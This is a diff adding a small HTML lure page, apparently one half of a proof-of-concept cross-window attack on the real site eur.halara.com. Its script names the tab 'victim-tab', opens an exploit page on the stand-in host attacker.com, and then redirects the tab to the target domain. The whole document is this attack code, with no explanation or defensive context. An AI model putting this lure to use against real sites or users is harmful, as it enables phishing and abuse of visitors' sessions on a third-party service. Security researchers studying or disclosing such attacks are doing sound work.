@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Loading...</title>
+</head>
+<body>
+    <h2>Redirecting...</h2>
+    <script>
+        // Name this window
+        window.name = 'victim-tab';
+        
+        // Open the exploit page in a new tab
+        window.open('https://attacker.com/exploit.html', '_blank');
+        
+        // Redirect this tab to the victim domain
+        setTimeout(() => {
+            window.location = 'https://eur.halara.com/';
+        }, 500);
+    </script>
+</body>
+</html>
